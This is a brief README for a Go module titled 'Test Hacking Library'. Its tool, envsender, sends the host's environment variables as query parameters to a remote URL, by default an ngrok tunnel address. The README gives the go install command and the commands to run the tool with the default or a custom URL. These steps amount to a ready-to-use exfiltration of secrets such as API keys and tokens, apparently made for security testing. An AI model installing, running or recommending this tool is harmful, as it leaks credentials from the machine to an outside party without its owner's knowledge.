# Test Hacking Library

A Go module that provides functionality to send environment variables as query parameters to a specified URL.

## Installation

To install the command-line tool, run:

```bash
go install github.com/rammarj/test-hacking-lib/cmd/envsender@latest
```

## Usage

The tool can be used in two ways:

1. As a command-line tool:
```bash
# Use default URL (https://9ccf312101ab.ngrok-free.app)
envsender

# Or specify a custom URL
envsender -url "https://your-custom-url.com"
```
